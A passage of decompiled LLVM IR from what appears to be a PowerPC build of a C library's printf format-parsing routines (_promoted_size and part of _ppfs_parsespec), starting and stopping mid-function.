dec_label_pc_1000a718:                            ; preds = %dec_label_pc_1000a70c
  %v1_1000a718 = add i32 %v0_1000a50c, 36
  %v2_1000a718 = inttoptr i32 %v1_1000a718 to i8*
  %v3_1000a718 = load i8, i8* %v2_1000a718, align 1
  %v4_1000a718 = zext i8 %v3_1000a718 to i32
  %v1_1000a71c = mul nuw nsw i32 %v4_1000a718, 8
  %v2_1000a720 = add i32 %v1_1000a71c, %v1_1000a510
  store i32 %v2_1000a720, i32* %r9.global-to-local, align 4
  %v1_1000a724 = add i32 %v2_1000a720, -8
  %v2_1000a724 = inttoptr i32 %v1_1000a724 to i32*
  %v3_1000a724 = load i32, i32* %v2_1000a724, align 4
  store i32 %v3_1000a724, i32* %r0.global-to-local, align 4
  store i32 %v3_1000a724, i32* %v2_1000a514, align 4
  %v0_1000a72c.pre = load i32, i32* @r3, align 4
  %v1_1000a730.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000a72c

dec_label_pc_1000a72c:                            ; preds = %dec_label_pc_1000a70c, %dec_label_pc_1000a718
  %v1_1000a730 = phi i32 [ -2147483648, %dec_label_pc_1000a70c ], [ %v1_1000a730.pre, %dec_label_pc_1000a718 ]
  %v1_1000a748 = phi i32 [ %v0_1000a50c, %dec_label_pc_1000a70c ], [ %v0_1000a72c.pre, %dec_label_pc_1000a718 ]
  %v1_1000a72c = add i32 %v1_1000a748, 4
  %v2_1000a72c = inttoptr i32 %v1_1000a72c to i32*
  %v3_1000a72c = load i32, i32* %v2_1000a72c, align 4
  store i32 %v3_1000a72c, i32* %r0.global-to-local, align 4
  %v3_1000a730 = icmp sgt i32 %v3_1000a72c, %v1_1000a730
  %v4_1000a730 = icmp eq i32 %v3_1000a72c, %v1_1000a730
  store i1 %v3_1000a730, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000a730, label %dec_label_pc_1000a738, label %dec_label_pc_1000a74c

dec_label_pc_1000a738:                            ; preds = %dec_label_pc_1000a72c
  %v1_1000a738 = add i32 %v1_1000a748, 37
  %v2_1000a738 = inttoptr i32 %v1_1000a738 to i8*
  %v3_1000a738 = load i8, i8* %v2_1000a738, align 1
  %v4_1000a738 = zext i8 %v3_1000a738 to i32
  %v1_1000a73c = mul nuw nsw i32 %v4_1000a738, 8
  %v1_1000a740 = load i32, i32* @r8, align 4
  %v2_1000a740 = add i32 %v1_1000a73c, %v1_1000a740
  store i32 %v2_1000a740, i32* %r9.global-to-local, align 4
  %v1_1000a744 = add i32 %v2_1000a740, -8
  %v2_1000a744 = inttoptr i32 %v1_1000a744 to i32*
  %v3_1000a744 = load i32, i32* %v2_1000a744, align 4
  store i32 %v3_1000a744, i32* %r0.global-to-local, align 4
  store i32 %v3_1000a744, i32* %v2_1000a72c, align 4
  %v0_1000a74c.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000a74c

dec_label_pc_1000a74c:                            ; preds = %dec_label_pc_1000a6f8, %dec_label_pc_1000a6fc.preheader, %dec_label_pc_1000a72c, %dec_label_pc_1000a738
  %v0_1000a74c = phi i32 [ %v1_1000a748, %dec_label_pc_1000a72c ], [ %v0_1000a74c.pre, %dec_label_pc_1000a738 ], [ %v0_1000a6fc5, %dec_label_pc_1000a6fc.preheader ], [ %v0_1000a6fc, %dec_label_pc_1000a6f8 ]
  %v1_1000a74c = add i32 %v0_1000a74c, 8
  %v2_1000a74c = inttoptr i32 %v1_1000a74c to i32*
  %v3_1000a74c = load i32, i32* %v2_1000a74c, align 4
  store i32 %v3_1000a74c, i32* %r11.global-to-local, align 4
  %v2_1000a750 = icmp sgt i32 %v3_1000a74c, 0
  store i1 %v2_1000a750, i1* %cr7_gt.global-to-local, align 1
  %v0_1000a754 = load i32, i32* @lr, align 4
  %tmp27 = icmp sgt i32 %v3_1000a74c, -1
  call void @__pseudo_cond_branch(i1 %tmp27, i32 %v0_1000a754)
  %v0_1000a758 = load i32, i32* @r3, align 4
  %v1_1000a758 = add i32 %v0_1000a758, 16
  %v2_1000a758 = inttoptr i32 %v1_1000a758 to i32*
  %v3_1000a758 = load i32, i32* %v2_1000a758, align 4
  store i32 %v3_1000a758, i32* %r0.global-to-local, align 4
  %v0_1000a75c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a75c = sub i32 0, %v0_1000a75c
  store i32 %v1_1000a75c, i32* %r11.global-to-local, align 4
  store i32 32, i32* %r9.global-to-local, align 4
  %v2_1000a764 = add i32 %v0_1000a758, 8
  %v3_1000a764 = inttoptr i32 %v2_1000a764 to i32*
  store i32 %v1_1000a75c, i32* %v3_1000a764, align 4
  %v0_1000a768 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a768 = or i32 %v0_1000a768, 8
  store i32 %v1_1000a768, i32* %r0.global-to-local, align 4
  %v0_1000a76c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a76c = load i32, i32* @r3, align 4
  %v2_1000a76c = add i32 %v1_1000a76c, 20
  %v3_1000a76c = inttoptr i32 %v2_1000a76c to i32*
  store i32 %v0_1000a76c, i32* %v3_1000a76c, align 4
  %v1_1000a770 = call i32 @__asm_rlwinm(i32 %v1_1000a768, i32 0, i32 0, i32 30)
  store i32 %v1_1000a770, i32* %r0.global-to-local, align 4
  %v1_1000a774 = load i32, i32* @r3, align 4
  %v2_1000a774 = add i32 %v1_1000a774, 16
  %v3_1000a774 = inttoptr i32 %v2_1000a774 to i32*
  store i32 %v1_1000a770, i32* %v3_1000a774, align 4
  %v0_1000a778 = load i32, i32* @r3, align 4
  ret i32 %v0_1000a778

; uselistorder directives
  uselistorder i32 %v3_1000a72c, { 1, 0, 2 }
  uselistorder i32 %v1_1000a730, { 1, 0 }
  uselistorder i32 %v3_1000a6fc, { 1, 0, 2 }
  uselistorder i32 %v1_1000a6f8, { 2, 3, 1, 0 }
  uselistorder i32 %v0_1000a6fc, { 0, 2, 1 }
  uselistorder i32 %v4_1000a674, { 1, 0, 2 }
  uselistorder i32 %v1_1000a634, { 1, 0 }
  uselistorder i32 %v1_1000a62c, { 2, 0, 1 }
  uselistorder i32 %v1_1000a5d8, { 0, 2, 1, 3 }
  uselistorder i32 %v3_1000a5cc, { 4, 1, 0, 3, 2, 8, 5, 7, 6, 10, 9, 11 }
  uselistorder i32 %v0_1000a5c4, { 1, 0 }
  uselistorder i32 %v2_1000a6d8, { 5, 3, 4, 1, 2, 6, 7, 0 }
  uselistorder i32 %v0_1000a6fc5, { 1, 0, 2 }
  uselistorder i32 %v3_1000a56c, { 1, 0, 2 }
  uselistorder i32 %v2_1000a59c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_1000a514, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v3_1000a50c, { 1, 0, 2 }
  uselistorder i32 %v0_1000a50c, { 4, 5, 2, 0, 1, 3, 6, 7, 8 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 16, 18, 19, 21, 20, 22, 23 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 18, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 28 }
  uselistorder i1* %cr7_gt.global-to-local, { 3, 4, 5, 14, 6, 7, 8, 9, 2, 1, 10, 11, 12, 13, 0, 15, 16, 17, 18, 19 }
  uselistorder i32 76, { 3, 4, 5, 6, 1, 0, 2, 7 }
  uselistorder label %dec_label_pc_1000a74c, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a72c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a6f8, { 1, 0 }
  uselistorder label %dec_label_pc_1000a6f4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000a6ec, { 1, 0 }
  uselistorder label %dec_label_pc_1000a6bc, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000a670, { 1, 0 }
  uselistorder label %dec_label_pc_1000a65c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a5c4, { 1, 0 }
  uselistorder label %dec_label_pc_1000a6fc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000a5b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000a56c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a560, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  br label %dec_label_pc_1000a788

dec_label_pc_1000a788:                            ; preds = %dec_label_pc_1000a788, %entry
  %v0_1000a788 = phi i32 [ ptrtoint (i32* @global_var_1001609c.295 to i32), %entry ], [ %v1_1000a788, %dec_label_pc_1000a788 ]
  %v1_1000a788 = add i32 %v0_1000a788, -2
  %v2_1000a788 = inttoptr i32 %v1_1000a788 to i16*
  %v3_1000a788 = load i16, i16* %v2_1000a788, align 2
  %v4_1000a788 = sext i16 %v3_1000a788 to i32
  %v4_1000a78c = icmp eq i32 %v4_1000a788, %arg1
  %v3_1000a790.not = icmp ule i32 %v1_1000a788, ptrtoint (i32* @global_var_10016084.296 to i32)
  %brmerge = or i1 %v4_1000a78c, %v3_1000a790.not
  br i1 %brmerge, label %dec_label_pc_1000a79c, label %dec_label_pc_1000a788

dec_label_pc_1000a79c:                            ; preds = %dec_label_pc_1000a788
  %v2_1000a7a4 = sub i32 %v1_1000a788, ptrtoint (i32* @global_var_10016084.296 to i32)
  %v1_1000a7ac = udiv i32 %v2_1000a7a4, 2
  %v2_1000a7ac = and i32 %v2_1000a7a4, -2147483648
  %v3_1000a7ac = or i32 %v1_1000a7ac, %v2_1000a7ac
  %v2_1000a7b4 = add i32 %v3_1000a7ac, ptrtoint (i32* @global_var_1001609c.295 to i32)
  %v3_1000a7b4 = inttoptr i32 %v2_1000a7b4 to i8*
  %v4_1000a7b4 = load i8, i8* %v3_1000a7b4, align 1
  %v5_1000a7b4 = zext i8 %v4_1000a7b4 to i32
  ret i32 %v5_1000a7b4

; uselistorder directives
  uselistorder i32 %v2_1000a7a4, { 1, 0 }
  uselistorder i32 %v1_1000a788, { 1, 0, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_10016084.296 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1001609c.295 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %tmp46 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-79 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v0_1000a7bc = load i32, i32* @lr, align 4
  store i32 %v0_1000a7bc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 %tmp, i32* @r28, align 4
  %v1_1000a7d4 = add i32 %tmp, 16
  %v2_1000a7d4 = inttoptr i32 %v1_1000a7d4 to i32*
  %v3_1000a7d4 = load i32, i32* %v2_1000a7d4, align 4
  %v1_1000a7dc = and i32 %v3_1000a7d4, 128
  store i32 %v1_1000a7dc, i32* %r6.global-to-local, align 4
  %v3_1000a7dc = icmp eq i32 %v1_1000a7dc, 0
  store i32 8, i32* %r0.global-to-local, align 4
  store i32 8, i32* %stack_var_-104, align 4
  %v1_1000a7f0 = add i32 %tmp, 24
  %v2_1000a7f0 = inttoptr i32 %v1_1000a7f0 to i32*
  %v3_1000a7f0 = load i32, i32* %v2_1000a7f0, align 4
  store i32 %v3_1000a7f0, i32* @r26, align 4
  br i1 %v3_1000a7dc, label %dec_label_pc_1000a7f8, label %dec_label_pc_1000a810

dec_label_pc_1000a7f8:                            ; preds = %entry
  %v2_1000a7f8 = load i32, i32* %arg1, align 4
  %.pre = ptrtoint i32* %stack_var_-104 to i32
  br label %dec_label_pc_1000a864

dec_label_pc_1000a808:                            ; preds = %dec_label_pc_1000aa38
  %v1_1000a808 = add i32 %v0_1000aa08, 1
  store i32 %v1_1000a808, i32* @r30, align 4
  br label %dec_label_pc_1000aa50

dec_label_pc_1000a810:                            ; preds = %entry
  store i32 32, i32* %r0.global-to-local, align 4
  %v2_1000a814 = load i32, i32* %arg1, align 4
  store i32 %v2_1000a814, i32* @r8, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1000a820 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1000a820, i32* @r7, align 4
  br label %dec_label_pc_1000a824

dec_label_pc_1000a824:                            ; preds = %dec_label_pc_1000a854.dec_label_pc_1000a824_crit_edge, %dec_label_pc_1000a810
  %v0_1000a82c = phi i32 [ %v0_1000a82c.pre, %dec_label_pc_1000a854.dec_label_pc_1000a824_crit_edge ], [ %v2_1000a814, %dec_label_pc_1000a810 ]
  %v0_1000a828 = phi i32 [ %v0_1000a828.pre, %dec_label_pc_1000a854.dec_label_pc_1000a824_crit_edge ], [ %v2_1000a820, %dec_label_pc_1000a810 ]
  %v0_1000a830 = phi i32 [ %v0_1000a824.pre, %dec_label_pc_1000a854.dec_label_pc_1000a824_crit_edge ], [ 0, %dec_label_pc_1000a810 ]
  %v1_1000a824 = mul i32 %v0_1000a830, 4
  %v2_1000a828 = add i32 %v0_1000a830, %v0_1000a828
  store i32 %v2_1000a828, i32* %r9.global-to-local, align 4
  %v2_1000a82c = add i32 %v1_1000a824, %v0_1000a82c
  store i32 %v2_1000a82c, i32* %r11.global-to-local, align 4
  %v1_1000a830 = add i32 %v0_1000a830, 1
  store i32 %v1_1000a830, i32* @r10, align 4
  %v1_1000a834 = add i32 %v2_1000a82c, -4
  %v2_1000a834 = inttoptr i32 %v1_1000a834 to i32*
  %v3_1000a834 = load i32, i32* %v2_1000a834, align 4
  store i32 %v3_1000a834, i32* %r0.global-to-local, align 4
  %v1_1000a838 = trunc i32 %v3_1000a834 to i8
  %v3_1000a838 = add i32 %v2_1000a828, 24
  %v4_1000a838 = inttoptr i32 %v3_1000a838 to i8*
  store i8 %v1_1000a838, i8* %v4_1000a838, align 1
  %v0_1000a83c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a83c = urem i32 %v0_1000a83c, 256
  store i32 %v1_1000a83c, i32* %r0.global-to-local, align 4
  %v0_1000a844 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a844 = add i32 %v0_1000a844, -4
  %v2_1000a844 = inttoptr i32 %v1_1000a844 to i32*
  %v3_1000a844 = load i32, i32* %v2_1000a844, align 4
  store i32 %v3_1000a844, i32* %r9.global-to-local, align 4
  %v4_1000a848 = icmp eq i32 %v1_1000a83c, %v3_1000a844
  br i1 %v4_1000a848, label %dec_label_pc_1000a850, label %dec_label_pc_1000acc0

dec_label_pc_1000a850:                            ; preds = %dec_label_pc_1000a824
  %v3_1000a840 = icmp eq i32 %v1_1000a83c, 0
  br i1 %v3_1000a840, label %dec_label_pc_1000a858, label %dec_label_pc_1000a854

dec_label_pc_1000a854:                            ; preds = %dec_label_pc_1000a850
  %v0_1000a854 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a854 = add i32 %v0_1000a854, -1
  store i32 %v1_1000a854, i32* %ctr.global-to-local, align 4
  %v2_1000a854 = icmp eq i32 %v1_1000a854, 0
  br i1 %v2_1000a854, label %dec_label_pc_1000a858, label %dec_label_pc_1000a854.dec_label_pc_1000a824_crit_edge

dec_label_pc_1000a854.dec_label_pc_1000a824_crit_edge: ; preds = %dec_label_pc_1000a854
  %v0_1000a824.pre = load i32, i32* @r10, align 4
  %v0_1000a828.pre = load i32, i32* @r7, align 4
  %v0_1000a82c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1000a824

dec_label_pc_1000a858:                            ; preds = %dec_label_pc_1000a854, %dec_label_pc_1000a850
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000a85c = ptrtoint i32* %stack_var_-79 to i32
  br label %dec_label_pc_1000a864

dec_label_pc_1000a864:                            ; preds = %dec_label_pc_1000a7f8, %dec_label_pc_1000a858
  %v2_1000a874.pre-phi = phi i32 [ %.pre, %dec_label_pc_1000a7f8 ], [ %v2_1000a820, %dec_label_pc_1000a858 ]
  %storemerge3 = phi i32 [ %v2_1000a7f8, %dec_label_pc_1000a7f8 ], [ %v2_1000a85c, %dec_label_pc_1000a858 ]
  store i32 %storemerge3, i32* @r10, align 4
  store i32 0, i32* @r31, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  store i32 268500992, i32* @r27, align 4
  store i32 %v2_1000a874.pre-phi, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000a884

dec_label_pc_1000a880:                            ; preds = %dec_label_pc_1000a990, %dec_label_pc_1000aa14
  %v0_1000a880 = phi i32 [ %v1_1000aa14, %dec_label_pc_1000aa14 ], [ %v0_1000a978, %dec_label_pc_1000a990 ]
  %stack_var_-84.0 = phi i32 [ %stack_var_-84.3, %dec_label_pc_1000aa14 ], [ %stack_var_-84.2, %dec_label_pc_1000a990 ]
  store i32 %v0_1000a880, i32* @r10, align 4
  br label %dec_label_pc_1000a884

dec_label_pc_1000a884:                            ; preds = %dec_label_pc_1000a864, %dec_label_pc_1000a880
  %v0_1000a898 = phi i32 [ %storemerge3, %dec_label_pc_1000a864 ], [ %v0_1000a880, %dec_label_pc_1000a880 ]
  %stack_var_-84.1 = phi i32 [ %tmp46, %dec_label_pc_1000a864 ], [ %stack_var_-84.0, %dec_label_pc_1000a880 ]
  %v1_1000a884 = inttoptr i32 %v0_1000a898 to i8*
  %v2_1000a884 = load i8, i8* %v1_1000a884, align 1
  %v3_1000a884 = zext i8 %v2_1000a884 to i32
  store i32 %v3_1000a884, i32* %r0.global-to-local, align 4
  store i32 %v0_1000a898, i32* @r30, align 4
  %v3_1000a88c = icmp eq i8 %v2_1000a884, 42
  br i1 %v3_1000a88c, label %dec_label_pc_1000a894, label %dec_label_pc_1000a8a4

dec_label_pc_1000a894:                            ; preds = %dec_label_pc_1000a884
  %v0_1000a894 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000a894 = mul i32 %v0_1000a894, -4
  store i32 %v1_1000a894, i32* %r0.global-to-local, align 4
  %v1_1000a898 = add i32 %v0_1000a898, 1
  store i32 %v1_1000a898, i32* @r30, align 4
  %v0_1000a89c = load i32, i32* @r1, align 4
  %v2_1000a89c = add i32 %v0_1000a89c, %v1_1000a894
  store i32 %v2_1000a89c, i32* %r9.global-to-local, align 4
  %v0_1000a8a0 = load i32, i32* @r29, align 4
  %v2_1000a8a0 = add i32 %v2_1000a89c, 8
  %v3_1000a8a0 = inttoptr i32 %v2_1000a8a0 to i32*
  store i32 %v0_1000a8a0, i32* %v3_1000a8a0, align 4
  %v0_1000a8bc.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000a8a4

dec_label_pc_1000a8a4:                            ; preds = %dec_label_pc_1000a884, %dec_label_pc_1000a894
  %v0_1000a8bc.pre = phi i32 [ %v0_1000a898, %dec_label_pc_1000a884 ], [ %v0_1000a8bc.pre.pre, %dec_label_pc_1000a894 ]
  %v0_1000a8a4 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000a8a4 = add i32 %v0_1000a8a4, -15664
  %v2_1000a8a4 = inttoptr i32 %v1_1000a8a4 to i32*
  %v3_1000a8a4 = load i32, i32* %v2_1000a8a4, align 4
  store i32 %v3_1000a8a4, i32* @r7, align 4
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_1000a8bc

dec_label_pc_1000a8b0:                            ; preds = %dec_label_pc_1000a8bc
  %v2_1000a8c0 = icmp sgt i32 %v0_1000a908, 4094
  br i1 %v2_1000a8c0, label %dec_label_pc_1000a8b8, label %dec_label_pc_1000a8b4

dec_label_pc_1000a8b4:                            ; preds = %dec_label_pc_1000a8b0
  %v1_1000a8b4 = add i32 %v2_1000a8d4, -48
  store i32 %v1_1000a8b4, i32* @r8, align 4
  br label %dec_label_pc_1000a8b8

dec_label_pc_1000a8b8:                            ; preds = %dec_label_pc_1000a8b0, %dec_label_pc_1000a8b4
  %v0_1000a8c015 = phi i32 [ %v0_1000a908, %dec_label_pc_1000a8b0 ], [ %v1_1000a8b4, %dec_label_pc_1000a8b4 ]
  %v1_1000a8b8 = add i32 %v0_1000a938, 1
  store i32 %v1_1000a8b8, i32* @r30, align 4
  br label %dec_label_pc_1000a8bc

dec_label_pc_1000a8bc:                            ; preds = %dec_label_pc_1000a8a4, %dec_label_pc_1000a8b8
  %v0_1000a908 = phi i32 [ 0, %dec_label_pc_1000a8a4 ], [ %v0_1000a8c015, %dec_label_pc_1000a8b8 ]
  %v0_1000a938 = phi i32 [ %v0_1000a8bc.pre, %dec_label_pc_1000a8a4 ], [ %v1_1000a8b8, %dec_label_pc_1000a8b8 ]
  %v1_1000a8bc = inttoptr i32 %v0_1000a938 to i8*
  %v2_1000a8bc = load i8, i8* %v1_1000a8bc, align 1
  %v3_1000a8bc = zext i8 %v2_1000a8bc to i32
  store i32 %v3_1000a8bc, i32* %r11.global-to-local, align 4
  %v1_1000a8c4 = mul nuw nsw i32 %v3_1000a8bc, 2
  store i32 %v1_1000a8c4, i32* %r9.global-to-local, align 4
  %v2_1000a8c8 = add i32 %v1_1000a8c4, %v3_1000a8a4
  %v3_1000a8c8 = inttoptr i32 %v2_1000a8c8 to i16*
  %v4_1000a8c8 = load i16, i16* %v3_1000a8c8, align 2
  %v5_1000a8c8 = zext i16 %v4_1000a8c8 to i32
  store i32 %v5_1000a8c8, i32* %r0.global-to-local, align 4
  %v1_1000a8cc = mul i32 %v0_1000a908, 10
  %v1_1000a8d0 = and i32 %v5_1000a8c8, 8
  store i32 %v1_1000a8d0, i32* @r25, align 4
  %v3_1000a8d0 = icmp eq i32 %v1_1000a8d0, 0
  %v2_1000a8d4 = add i32 %v3_1000a8bc, %v1_1000a8cc
  store i32 %v2_1000a8d4, i32* %r9.global-to-local, align 4
  br i1 %v3_1000a8d0, label %dec_label_pc_1000a8dc, label %dec_label_pc_1000a8b0

dec_label_pc_1000a8dc:                            ; preds = %dec_label_pc_1000a8bc
  %v0_1000a8dc = load i32, i32* @r10, align 4
  %v1_1000a8dc = add i32 %v0_1000a8dc, -1
  %v2_1000a8dc = inttoptr i32 %v1_1000a8dc to i8*
  %v3_1000a8dc = load i8, i8* %v2_1000a8dc, align 1
  %v4_1000a8dc = zext i8 %v3_1000a8dc to i32
  store i32 %v4_1000a8dc, i32* %r0.global-to-local, align 4
  %v3_1000a8e0 = icmp eq i8 %v3_1000a8dc, 37
  br i1 %v3_1000a8e0, label %dec_label_pc_1000a8e8, label %dec_label_pc_1000a9b0

dec_label_pc_1000a8e8:                            ; preds = %dec_label_pc_1000a8dc
  %v3_1000a8e8 = icmp eq i8 %v2_1000a8bc, 36
  br i1 %v3_1000a8e8, label %dec_label_pc_1000a8f0, label %dec_label_pc_1000a924

dec_label_pc_1000a8f0:                            ; preds = %dec_label_pc_1000a8e8
  %tmp58 = icmp slt i32 %v0_1000a908, 1
  br i1 %tmp58, label %dec_label_pc_1000a924, label %dec_label_pc_1000a8f8

dec_label_pc_1000a8f8:                            ; preds = %dec_label_pc_1000a8f0
  %v0_1000a8f8 = load i32, i32* @r26, align 4
  %v3_1000a8f8 = icmp eq i32 %v0_1000a8f8, 0
  %v1_1000a8fc = add i32 %v0_1000a938, 1
  store i32 %v1_1000a8fc, i32* @r10, align 4
  br i1 %v3_1000a8f8, label %dec_label_pc_1000acc0, label %dec_label_pc_1000a904

dec_label_pc_1000a904:                            ; preds = %dec_label_pc_1000a8f8
  %v3_1000a904 = icmp sgt i32 %v0_1000a908, %v0_1000a8f8
  br i1 %v3_1000a904, label %dec_label_pc_1000a910, label %dec_label_pc_1000a91c

dec_label_pc_1000a910:                            ; preds = %dec_label_pc_1000a904
  store i32 %v0_1000a908, i32* @r26, align 4
  br label %dec_label_pc_1000a91c

dec_label_pc_1000a918:                            ; preds = %dec_label_pc_1000a940, %dec_label_pc_1000a938
  store i32 0, i32* @r26, align 4
  br label %dec_label_pc_1000a91c

dec_label_pc_1000a91c:                            ; preds = %dec_label_pc_1000a904, %dec_label_pc_1000a910, %dec_label_pc_1000a918
  %v0_1000a91c = phi i32 [ %v0_1000a8dc, %dec_label_pc_1000a918 ], [ %v1_1000a8fc, %dec_label_pc_1000a910 ], [ %v1_1000a8fc, %dec_label_pc_1000a904 ]
  %stack_var_-84.2 = phi i32 [ %stack_var_-84.1, %dec_label_pc_1000a918 ], [ %v0_1000a908, %dec_label_pc_1000a910 ], [ %v0_1000a908, %dec_label_pc_1000a904 ]
  br label %dec_label_pc_1000a958

dec_label_pc_1000a924:                            ; preds = %dec_label_pc_1000a8e8, %dec_label_pc_1000a8f0
  %v0_1000a924 = load i32, i32* @r26, align 4
  %tmp59 = icmp slt i32 %v0_1000a924, 1
  br i1 %tmp59, label %dec_label_pc_1000a938, label %dec_label_pc_1000a92c

dec_label_pc_1000a92c:                            ; preds = %dec_label_pc_1000a924
  %v3_1000a92c = icmp eq i8 %v2_1000a8bc, 109
  br i1 %v3_1000a92c, label %dec_label_pc_1000a9b0, label %dec_label_pc_1000acc0

dec_label_pc_1000a938:                            ; preds = %dec_label_pc_1000a924
  %v3_1000a938 = icmp ugt i32 %v0_1000a938, %v0_1000a8dc
  br i1 %v3_1000a938, label %dec_label_pc_1000a940, label %dec_label_pc_1000a918

dec_label_pc_1000a940:                            ; preds = %dec_label_pc_1000a938
  %v1_1000a940 = inttoptr i32 %v0_1000a8dc to i8*
  %v2_1000a940 = load i8, i8* %v1_1000a940, align 1
  %v3_1000a940 = zext i8 %v2_1000a940 to i32
  store i32 %v3_1000a940, i32* %r0.global-to-local, align 4
  store i32 %v0_1000a8dc, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v3_1000a94c = icmp eq i8 %v2_1000a940, 48
  br i1 %v3_1000a94c, label %dec_label_pc_1000a918, label %dec_label_pc_1000a9b4

dec_label_pc_1000a958:                            ; preds = %dec_label_pc_1000a974, %dec_label_pc_1000a91c
  %v0_1000a978 = phi i32 [ %v0_1000a91c, %dec_label_pc_1000a91c ], [ %v1_1000a978, %dec_label_pc_1000a974 ]
  store i32 %v0_1000a978, i32* @r30, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1001607c.299 to i32), i32* %r11.global-to-local, align 4
  %v1_1000a968 = inttoptr i32 %v0_1000a978 to i8*
  br label %dec_label_pc_1000a960

dec_label_pc_1000a960:                            ; preds = %dec_label_pc_1000a980, %dec_label_pc_1000a958
  %v1_1000a974 = phi i32 [ %v1_1000a984, %dec_label_pc_1000a980 ], [ 1, %dec_label_pc_1000a958 ]
  %v0_1000a960 = phi i32 [ %v1_1000a964, %dec_label_pc_1000a980 ], [ ptrtoint ([8 x i8]* @global_var_1001607c.299 to i32), %dec_label_pc_1000a958 ]
  %v1_1000a960 = inttoptr i32 %v0_1000a960 to i8*
  %v2_1000a960 = load i8, i8* %v1_1000a960, align 1
  %v3_1000a960 = zext i8 %v2_1000a960 to i32
  store i32 %v3_1000a960, i32* %r9.global-to-local, align 4
  %v1_1000a964 = add i32 %v0_1000a960, 1
  store i32 %v1_1000a964, i32* %r11.global-to-local, align 4
  %v2_1000a968 = load i8, i8* %v1_1000a968, align 1
  %v3_1000a968 = zext i8 %v2_1000a968 to i32
  store i32 %v3_1000a968, i32* %r0.global-to-local, align 4
  %v4_1000a96c = icmp eq i8 %v2_1000a968, %v2_1000a960
  br i1 %v4_1000a96c, label %dec_label_pc_1000a974, label %dec_label_pc_1000a980

dec_label_pc_1000a974:                            ; preds = %dec_label_pc_1000a960
  %v0_1000a974 = load i32, i32* %r6.global-to-local, align 4
  %v2_1000a974 = or i32 %v0_1000a974, %v1_1000a974
  store i32 %v2_1000a974, i32* %r6.global-to-local, align 4
  %v1_1000a978 = add i32 %v0_1000a978, 1
  br label %dec_label_pc_1000a958

dec_label_pc_1000a980:                            ; preds = %dec_label_pc_1000a960
  %v1_1000a980 = inttoptr i32 %v1_1000a964 to i8*
  %v2_1000a980 = load i8, i8* %v1_1000a980, align 1
  %v3_1000a980 = zext i8 %v2_1000a980 to i32
  store i32 %v3_1000a980, i32* %r0.global-to-local, align 4
  %v1_1000a984 = mul i32 %v1_1000a974, 2
  store i32 %v1_1000a984, i32* @r10, align 4
  %v3_1000a988 = icmp eq i8 %v2_1000a980, 0
  br i1 %v3_1000a988, label %dec_label_pc_1000a990, label %dec_label_pc_1000a960

dec_label_pc_1000a990:                            ; preds = %dec_label_pc_1000a980
  %v1_1000a990 = add i32 %v0_1000a978, -1
  %v2_1000a990 = inttoptr i32 %v1_1000a990 to i8*
  %v3_1000a990 = load i8, i8* %v2_1000a990, align 1
  %v4_1000a990 = zext i8 %v3_1000a990 to i32
  store i32 %v4_1000a990, i32* %r0.global-to-local, align 4
  %v0_1000a994 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000a994 = and i32 %v0_1000a994, 10
  store i32 0, i32* @r8, align 4
  %v3_1000a99c = icmp eq i8 %v3_1000a990, 37
  %v1_1000a9a0 = udiv i32 %v1_1000a994, 2
  store i32 %v1_1000a9a0, i32* %r9.global-to-local, align 4
